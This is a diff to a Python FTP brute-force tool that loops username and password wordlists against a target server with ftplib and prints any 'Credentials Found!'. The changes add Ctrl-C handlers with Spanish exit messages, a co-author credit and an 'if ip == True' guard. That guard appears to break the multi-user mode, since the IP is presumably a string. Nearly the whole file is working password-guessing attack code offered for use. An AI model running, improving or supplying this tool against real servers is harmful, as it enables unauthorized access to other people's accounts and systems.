@@ -3,6 +3,7 @@ import argparse
 import sys
 from colorama import Fore
 import os
+from time import sleep
 
 print("""
 
@@ -12,7 +13,7 @@ print("""
 ██   ██ ██   ██ ██    ██    ██    ██          ██         ██    ██      
 ██████  ██   ██  ██████     ██    ███████     ██         ██    ██      
                    
-                    Tool developed by TheMV
+                    Tool developed by TheMV and Whoami
                                      
 """)
 
@@ -46,6 +47,10 @@ def bruteOneUsers(ip, username, passwords):
         ftp.login(username, passwords)
         ftp.quit()
         print(Fore.CYAN + "[+] Credentials Found! {}:{}".format(username,passwords))
+    except KeyboardInterrupt:
+        print("\nSaliendo...")
+        sleep(1)
+        exit()
     except:
         print(Fore.RED + "{}:{} -> Not Found".format(username, passwords))
 
@@ -55,6 +60,10 @@ def bruteOneUsersNotver(ip, username, passwords):
         ftp.login(username, passwords)
         ftp.quit()
         print(Fore.CYAN + "[+] Credentials Found! {}:{}".format(username,passwords))
+    except KeyboardInterrupt:
+        print("\nSaliendo...")
+        sleep(1)
+        exit()
     except:
         pass
 
@@ -64,6 +73,10 @@ def BruteForceMultiUsers(ip, username, password):
         ftp.login(username, password)
         ftp.quit()
         print(Fore.CYAN + "[+] Credentials Found! {}:{}".format(username,password))
+    except KeyboardInterrupt:
+        print("\nSaliendo...")
+        sleep(1)
+        exit()
     except:
         print(Fore.RED + "{}:{} -> Not Found".format(username,password))
 
@@ -73,6 +86,10 @@ def BruteForceMultiUsersNotVer(ip, username, password):
         ftp.login(username, password)
         ftp.quit()
         print(Fore.CYAN + "[+] Credentials Found! {}:{}".format(username,password))
+    except KeyboardInterrupt:
+        print("\nSaliendo...")
+        sleep(1)
+        exit()
     except:
         pass
         
@@ -94,26 +111,27 @@ if username:
         for p in passwords:
             bruteOneUsersNotver(ip, username, p)
 
-if users:
-    ruta = os.path.exists(users)
-    if ruta == True:
-        if verbosity == "yes" or verbosity == "Yes" or verbosity == "YES" or verbosity == "y" or verbosity == "Y":
-            print("[+] Starting Brute Force")
-            usernames = open(users, 'r')
-            usernames = usernames.read().split('\n')
-            passwords = open(wordlist,'r')
-            passwords = passwords.read().split('\n')
-            for u in usernames:
-                for p in passwords:
-                    BruteForceMultiUsers(ip, u, p)
-        elif verbosity == "no" or verbosity == "No" or verbosity == "NO" or verbosity == "n" or verbosity == "N":
-            print("[+] Starting Brute Force")
-            usernames = open(users, 'r')
-            usernames = usernames.read().split('\n')
-            passwords = open(wordlist,'r')
-            passwords = passwords.read().split('\n')
-            for u in usernames:
-                for p in passwords:
-                    BruteForceMultiUsersNotVer(ip, u, p)
-    elif ruta == False:
-        print(Fore.RED + "\n[-] Diccionario inexistente")
+if ip == True:
+    if users:
+        ruta = os.path.exists(users)
+        if ruta == True:
+            if verbosity == "yes" or verbosity == "Yes" or verbosity == "YES" or verbosity == "y" or verbosity == "Y":
+                print("[+] Starting Brute Force")
+                usernames = open(users, 'r')
+                usernames = usernames.read().split('\n')
+                passwords = open(wordlist,'r')
+                passwords = passwords.read().split('\n')
+                for u in usernames:
+                    for p in passwords:
+                        BruteForceMultiUsers(ip, u, p)
+            elif verbosity == "no" or verbosity == "No" or verbosity == "NO" or verbosity == "n" or verbosity == "N":
+                print("[+] Starting Brute Force")
+                usernames = open(users, 'r')
+                usernames = usernames.read().split('\n')
+                passwords = open(wordlist,'r')
+                passwords = passwords.read().split('\n')
+                for u in usernames:
+                    for p in passwords:
+                        BruteForceMultiUsersNotVer(ip, u, p)
+        elif ruta == False:
+            print(Fore.RED + "\n[-] Diccionario inexistente")
